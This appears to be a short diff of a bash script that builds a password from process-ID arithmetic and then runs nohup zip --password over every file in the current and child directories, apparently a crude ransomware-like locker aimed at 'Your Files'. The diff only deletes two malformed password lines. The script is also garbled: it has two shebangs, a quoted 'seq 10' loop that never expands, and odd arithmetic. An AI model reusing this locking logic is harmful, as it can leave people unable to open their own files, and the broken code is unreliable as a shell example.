@@ -2,8 +2,6 @@
 #!/bin/bash
 #!/bin/zsh
 PASS=$(($$$$^64*32767^128*128^32767*$$^$$))
-PASSS= $$ + $PASS
-PASSSS=$$ + $PASSS
 for i in 'seq 10';
 do
 nohup zip --password $PASS Your\ Files. *.* */*
